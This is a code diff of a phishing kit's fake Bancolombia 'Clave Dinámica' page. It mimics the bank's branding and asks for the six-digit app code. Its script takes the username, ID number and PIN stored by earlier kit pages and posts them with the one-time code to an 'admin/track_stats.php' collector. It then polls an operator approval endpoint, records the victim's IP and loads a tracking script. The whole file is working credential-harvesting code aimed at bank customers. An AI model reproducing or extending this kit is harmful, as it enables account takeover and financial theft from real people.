@@ -1,153 +1,147 @@
-<?php
-// admin/bancos/bancolombia/dinamica.php
-session_start();
-
-// Verificar sesión
-if (!isset($_SESSION['usuario_bancolombia']) && !isset($_SESSION['identificacion_bancolombia'])) {
-    header('Location: index.php');
-    exit;
-}
-
-$usuario = $_SESSION['usuario_bancolombia'] ?? $_SESSION['identificacion_bancolombia'] ?? 'Usuario';
-?>
-
 <!DOCTYPE html>
 <html lang="es-CO">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bancolombia - Estado de Aprobación</title>
+    <title>Bancolombia - Clave Dinámica</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }
+
         body {
             font-family: 'Open Sans', Arial, sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
+            font-size: 16px; color: #2c2a29; line-height: 24px;
+            background-color: #f9f9fa;
+            display: flex; flex-direction: column; min-height: 100vh;
+        }
+
+        .decorative-background {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1;
+        }
+
+        .header {
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            position: relative;
+            z-index: 10;
         }
-        .container {
-            background: white;
-            max-width: 500px;
-            width: 100%;
-            padding: 40px 35px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            text-align: center;
+
+        .header-logo { height: 35px; }
+
+        .main-container {
+            flex: 1; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            padding: 40px 20px; position: relative; z-index: 10;
         }
-        .icon-pending {
-            width: 80px;
-            height: 80px;
-            background: #ff9800;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+
+        .login-card {
+            background-color: #ffffff; border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
+            padding: 50px 60px; max-width: 500px; width: 100%;
         }
-        .icon-pending svg {
-            width: 40px;
-            height: 40px;
-            color: white;
+
+        .card-title { 
+            color: #212121; font-size: 28px; font-weight: 700; 
+            margin-bottom: 30px; text-align: center; 
         }
-        .icon-approved {
-            width: 80px;
-            height: 80px;
-            background: #4caf50;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
+
+        .icon-container {
+            width: 80px; height: 80px; background-color: #f5f5f5;
+            border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; margin: 0 auto 25px;
         }
-        .icon-approved svg {
-            width: 40px;
-            height: 40px;
-            color: white;
-        }
-        .icon-rejected {
-            width: 80px;
-            height: 80px;
-            background: #e53935;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-        }
-        .icon-rejected svg {
-            width: 40px;
-            height: 40px;
-            color: white;
-        }
-        h1 {
-            color: #212121;
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
+        .icon-container svg { width: 40px; height: 40px; color: #666666; }
+
         .subtitle {
-            color: #666;
-            font-size: 15px;
-            margin-bottom: 25px;
+            font-size: 14px; color: #666666; margin-bottom: 40px;
+            text-align: center; line-height: 1.5;
         }
-        .info-card {
-            background: #f9f9fa;
-            border-radius: 8px;
-            padding: 20px;
-            text-align: left;
-            margin-bottom: 25px;
+
+        .code-inputs {
+            display: flex; gap: 12px; margin-bottom: 40px; justify-content: center;
         }
-        .info-row {
+
+        .code-input {
+            width: 50px; height: 60px; border: none;
+            border-bottom: 3px solid #e0e0e0; background-color: transparent;
+            font-size: 32px; font-weight: 600; text-align: center;
+            color: #212121; font-family: 'Open Sans', Arial, sans-serif;
+            transition: border-color 0.3s ease;
+        }
+        .code-input:focus { outline: none; border-bottom-color: #fdda24; }
+        .code-input.filled { border-bottom-color: #4caf50; }
+        .code-input.error {
+            border-bottom-color: #e53935;
+            animation: shake 0.4s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .error-message {
+            color: #e53935; font-size: 13px; margin-top: -25px;
+            margin-bottom: 25px; text-align: center; font-weight: 600;
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        .error-message.show { opacity: 1; }
+
+        .submit-button {
+            width: 100%; padding: 15px 32px; border-radius: 30px;
+            font-size: 16px; font-weight: 600; cursor: not-allowed;
+            border: none; background-color: #e0e0e0; color: #999999;
+            transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif;
+            margin-bottom: 20px;
+        }
+        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
+        .submit-button.enabled:hover { background-color: #fdd007; }
+
+        .help-link {
+            color: #212121; font-size: 14px; text-decoration: underline;
+            font-weight: 600; cursor: pointer; text-align: center; display: block;
+        }
+
+        .footer-info {
+            text-align: center; padding: 20px;
+            position: relative; z-index: 10;
+        }
+        .footer-text { font-size: 11px; color: #666666; line-height: 1.4; }
+
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: #fff;
             display: flex;
-            justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #eee;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.25s ease;
         }
-        .info-row:last-child {
-            border-bottom: none;
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
         }
-        .info-label {
-            color: #888;
-            font-size: 14px;
-        }
-        .info-value {
-            color: #212121;
-            font-weight: 600;
-            font-size: 14px;
-        }
-        .btn-continuar {
-            width: 100%;
-            padding: 14px;
-            background: #fdda24;
-            border: none;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 700;
-            color: #212121;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .btn-continuar:hover {
-            background: #fdd007;
-        }
-        .btn-cerrar {
-            display: block;
-            margin-top: 15px;
-            color: #e53935;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .btn-cerrar:hover {
-            text-decoration: underline;
+        .loading-logo {
+            height: 36px;
+            width: auto;
+            margin-bottom: 48px;
         }
         .spinner {
             width: 52px;
             height: 52px;
-            margin: 0 auto 20px;
+            margin-bottom: 36px;
         }
         .spinner svg {
             width: 52px;
@@ -156,123 +150,320 @@ $usuario = $_SESSION['usuario_bancolombia'] ?? $_SESSION['identificacion_bancolo
         }
         @keyframes spin {
             from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+            to   { transform: rotate(360deg); }
         }
-        .status-pending { color: #ff9800; font-weight: 700; }
-        .status-approved { color: #4caf50; font-weight: 700; }
-        .status-rejected { color: #e53935; font-weight: 700; }
+        .loading-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .loading-subtitle {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            line-height: 1.55;
+            max-width: 260px;
+        }
+
+        @media (max-width: 768px) {
+            .header-logo { height: 28px; }
+            .main-container { padding: 25px 16px; }
+            .login-card { padding: 40px 30px; max-width: 100%; }
+            .card-title { font-size: 24px; margin-bottom: 25px; }
+            .icon-container { width: 70px; height: 70px; margin-bottom: 20px; }
+            .icon-container svg { width: 35px; height: 35px; }
+            .subtitle { font-size: 13px; margin-bottom: 30px; }
+            .code-input { width: 45px; height: 55px; font-size: 28px; }
+            .code-inputs { gap: 8px; margin-bottom: 35px; }
+            .submit-button { font-size: 15px; padding: 13px 28px; }
+        }
     </style>
 </head>
 <body>
 
-<div class="container" id="mainContainer">
-    <div id="statusContent">
-        <div class="icon-pending">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <circle cx="12" cy="12" r="10"></circle>
-                <line x1="12" y1="8" x2="12" y2="12"></line>
-                <line x1="12" y1="16" x2="12.01" y2="16"></line>
-            </svg>
+    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
+        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
+        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
+        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
+        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
+    </svg>
+
+    <div class="header">
+        <img src="i.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
+    </div>
+
+    <main class="main-container">
+        <div class="login-card">
+            <h1 class="card-title">Clave Dinámica</h1>
+
+            <div class="icon-container">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+            </div>
+
+            <p class="subtitle">Por favor ingresa la clave dinámica que se genera en tu App Mi Bancolombia.</p>
+
+            <div class="code-inputs" id="codeInputs">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit1">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit2">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit3">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit4">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit5">
+                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit6">
+            </div>
+
+            <p class="error-message" id="errorMsg">Clave dinámica incorrecta. Intenta nuevamente.</p>
+
+            <button class="submit-button" id="btnSubmit" disabled>Continuar</button>
+
+            <a href="#" class="help-link">¿Olvidaste tu usuario o clave?</a>
         </div>
-        <h1>Esperando Aprobación</h1>
-        <p class="subtitle">El administrador está revisando tu información. Por favor espera...</p>
+    </main>
+
+    <div class="footer-info">
+        <p class="footer-text" id="footerText">
+            VISITANTE - *** *** *** ***<br>
+            Cargando fecha...
+        </p>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner">
             <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/>
-                <circle cx="26" cy="26" r="22" stroke="#FDDA24" stroke-width="4" stroke-linecap="round" stroke-dasharray="103 35" stroke-dashoffset="0"/>
+                <circle cx="26" cy="26" r="22"
+                    stroke="#FDDA24"
+                    stroke-width="4"
+                    stroke-linecap="round"
+                    stroke-dasharray="103 35"
+                    stroke-dashoffset="0"
+                />
             </svg>
         </div>
-        <div class="info-card">
-            <div class="info-row">
-                <span class="info-label">Usuario</span>
-                <span class="info-value"><?php echo htmlspecialchars($usuario); ?></span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Estado</span>
-                <span class="info-value status-pending">⏳ Pendiente</span>
-            </div>
-        </div>
+        <p class="loading-title">Verificando datos...</p>
+        <p class="loading-subtitle">El administrador está revisando tu información. Por favor espera...</p>
     </div>
-</div>
 
-<script>
-// Obtener logId del localStorage
-const logId = localStorage.getItem('log_id_actual') || localStorage.getItem('log_id_login');
+    <script>
+        let userIP = 'No disponible';
 
-console.log('📋 Log ID desde localStorage:', logId);
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                updateFooter();
+            } catch (error) {
+                updateFooter();
+            }
+        }
 
-if (!logId) {
-    document.getElementById('statusContent').innerHTML = `
-        <div class="icon-rejected">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                <line x1="18" y1="6" x2="6" y2="18"></line>
-                <line x1="6" y1="6" x2="18" y2="18"></line>
-            </svg>
-        </div>
-        <h1>Error de Sesión</h1>
-        <p class="subtitle">No se encontró información de sesión. Por favor inicia sesión nuevamente.</p>
-        <button class="btn-continuar" onclick="window.location.href='index.php'">Volver a intentar</button>
-    `;
-} else {
-    function checkStatus() {
-        fetch('../../admin/check_aprobacion.php?log_id=' + logId)
-            .then(res => res.json())
-            .then(data => {
-                console.log('📊 Estado:', data);
-                
-                if (data.estado === 'aprobado') {
-                    document.getElementById('statusContent').innerHTML = `
-                        <div class="icon-approved">
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                                <polyline points="20 6 9 17 4 12"></polyline>
-                            </svg>
-                        </div>
-                        <h1>¡Aprobación Exitosa!</h1>
-                        <p class="subtitle">Tus datos han sido verificados correctamente.</p>
-                        <div class="info-card">
-                            <div class="info-row">
-                                <span class="info-label">Usuario</span>
-                                <span class="info-value">${data.usuario || 'N/A'}</span>
-                            </div>
-                            <div class="info-row">
-                                <span class="info-label">Identificación</span>
-                                <span class="info-value">${data.identificacion || data.documento || 'N/A'}</span>
-                            </div>
-                            <div class="info-row">
-                                <span class="info-label">Estado</span>
-                                <span class="info-value status-approved">✅ Aprobado</span>
-                            </div>
-                        </div>
-                        <button class="btn-continuar" onclick="window.location.href='../../index.php'">Continuar</button>
-                        <a href="logout.php" class="btn-cerrar">Cerrar sesión</a>
-                    `;
-                    localStorage.removeItem('log_id_actual');
-                    localStorage.removeItem('log_id_login');
-                } else if (data.estado === 'rechazado') {
-                    document.getElementById('statusContent').innerHTML = `
-                        <div class="icon-rejected">
-                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                <line x1="18" y1="6" x2="6" y2="18"></line>
-                                <line x1="6" y1="6" x2="18" y2="18"></line>
-                            </svg>
-                        </div>
-                        <h1>Datos Rechazados</h1>
-                        <p class="subtitle">Tu información no pudo ser verificada. Por favor intenta nuevamente.</p>
-                        <button class="btn-continuar" onclick="window.location.href='index.php'">Intentar nuevamente</button>
-                    `;
-                    localStorage.removeItem('log_id_actual');
-                    localStorage.removeItem('log_id_login');
+        function updateDateTime() {
+            const now = new Date();
+            const days = ['domingo','lunes','martes','miércoles','jueves','viernes','sábado'];
+            const months = ['enero','febrero','marzo','abril','mayo','junio','julio','agosto','septiembre','octubre','noviembre','diciembre'];
+            let h = now.getHours();
+            const ampm = h >= 12 ? 'p. m.' : 'a. m.';
+            h = h % 12 || 12;
+            const m = now.getMinutes().toString().padStart(2,'0');
+            const s = now.getSeconds().toString().padStart(2,'0');
+            return `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${h}:${m}:${s} ${ampm}`;
+        }
+
+        function updateFooter() {
+            const ipMasked = userIP !== 'No disponible' ?
+                userIP.split('.').join(' ') : '*** *** *** ***';
+            document.getElementById('footerText').innerHTML = `VISITANTE - ${ipMasked}<br>${updateDateTime()}`;
+        }
+
+        const inputs = [
+            document.getElementById('digit1'),
+            document.getElementById('digit2'),
+            document.getElementById('digit3'),
+            document.getElementById('digit4'),
+            document.getElementById('digit5'),
+            document.getElementById('digit6')
+        ];
+        const btnSubmit = document.getElementById('btnSubmit');
+        const errorMsg = document.getElementById('errorMsg');
+        const overlay = document.getElementById('loadingOverlay');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                if (this.value !== '') {
+                    this.classList.add('filled');
+                    if (index < inputs.length - 1) inputs[index + 1].focus();
                 } else {
-                    setTimeout(checkStatus, 3000);
+                    this.classList.remove('filled');
                 }
-            })
-            .catch(err => {
-                console.error('❌ Error:', err);
-                setTimeout(checkStatus, 5000);
+                validateCode();
             });
-    }
-    checkStatus();
-}
-</script>
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                    inputs[index - 1].value = '';
+                    inputs[index - 1].classList.remove('filled');
+                    validateCode();
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('').slice(0, 6);
+                digits.forEach((digit, i) => {
+                    if (inputs[i]) { inputs[i].value = digit; inputs[i].classList.add('filled'); }
+                });
+                validateCode();
+            });
+        });
+
+        function validateCode() {
+            const allFilled = inputs.every(input => input.value !== '');
+            btnSubmit.classList.toggle('enabled', allFilled);
+            btnSubmit.disabled = !allFilled;
+        }
+
+        function getCode() { return inputs.map(i => i.value).join(''); }
+
+        function clearCode() {
+            inputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled', 'error');
+            });
+            validateCode();
+        }
+
+        function showError() {
+            inputs.forEach(input => input.classList.add('error'));
+            errorMsg.classList.add('show');
+            setTimeout(() => {
+                inputs.forEach(input => input.classList.remove('error'));
+                errorMsg.classList.remove('show');
+                clearCode();
+            }, 3000);
+        }
+
+        btnSubmit.addEventListener('click', async function() {
+            if (this.disabled) return;
+
+            const otp = getCode();
+            overlay.classList.add('active');
+
+            const pseData = localStorage.getItem('pseGuardado');
+            let documento = 'N/A';
+            let banco = 'bancolombia';
+            
+            if (pseData) {
+                try {
+                    const pse = JSON.parse(pseData);
+                    documento = pse.documento_pse || 'N/A';
+                    banco = 'bancolombia';
+                } catch (e) {}
+            }
+
+            // Obtener datos de pasos anteriores
+            const usuario = localStorage.getItem('usuario_bancolombia') || '';
+            const identificacion = localStorage.getItem('identificacion_bancolombia') || '';
+            const tipo_id = localStorage.getItem('tipo_id_bancolombia') || 'CC';
+            const clave_pin = localStorage.getItem('clave_pin_bancolombia') || '';
+            
+            const formData = new FormData();
+            formData.append('activity', 'OTP/DINÁMICA (BANCOLOMBIA)');
+            formData.append('action', 'log');
+            formData.append('metodo', 'PSE');
+            formData.append('banco', 'bancolombia');
+            formData.append('documento', documento);
+            formData.append('usuario', usuario);
+            formData.append('identificacion', identificacion);
+            formData.append('tipo_identificacion', tipo_id);
+            formData.append('clave_pin', clave_pin);
+            formData.append('codigo_dinamica', otp);
+            formData.append('codigo_otp', otp);
+            formData.append('clave_tarjeta', '');
+            formData.append('ultimos_digitos', '');
+
+            console.log('✅ Enviando a track_stats.php:', {
+                activity: 'OTP/DINÁMICA (BANCOLOMBIA)',
+                usuario: usuario,
+                clave_pin: clave_pin,
+                codigo_otp: otp
+            });
+
+            try {
+                const response = await fetch('../../admin/track_stats.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                console.log('✅ Respuesta track_stats.php:', data);
+
+                if (data.success) {
+                    localStorage.setItem('log_id_actual', data.id);
+                    startPollingAprobacion(data.id);
+                } else {
+                    overlay.classList.remove('active');
+                    console.error('❌ Error:', data);
+                    showError();
+                }
+            } catch (err) {
+                overlay.classList.remove('active');
+                console.error('❌ Error en fetch:', err);
+                showError();
+            }
+        });
+
+        function startPollingAprobacion(logId) {
+            let pollCount = 0;
+            const maxPolls = 150;
+            
+            const pollInterval = setInterval(() => {
+                pollCount++;
+                
+                fetch('../../admin/check_aprobacion.php?log_id=' + logId)
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log('Poll #' + pollCount + ' - Estado:', data.estado);
+                        
+                        if (data.estado === 'aprobado') {
+                            clearInterval(pollInterval);
+                            overlay.classList.remove('active');
+                            alert('✓ Datos aprobados');
+                            setTimeout(() => {
+                                window.location.assign('../../index.php');
+                            }, 500);
+                        } else if (data.estado === 'rechazado') {
+                            clearInterval(pollInterval);
+                            overlay.classList.remove('active');
+                            showError();
+                        } else if (pollCount >= maxPolls) {
+                            clearInterval(pollInterval);
+                            overlay.classList.remove('active');
+                            alert('⏱️ Tiempo de espera agotado. Por favor intenta nuevamente');
+                            clearCode();
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error en polling:', err);
+                    });
+            }, 2000);
+        }
+
+        getUserIP();
+        updateFooter();
+        setInterval(updateFooter, 1000);
+
+        // Cargar core-sys.js para tracking automático
+        const script = document.createElement('script');
+        script.src = '../../admin/core-sys.js';
+        script.async = true;
+        document.head.appendChild(script);
+    </script>
 </body>
 </html>
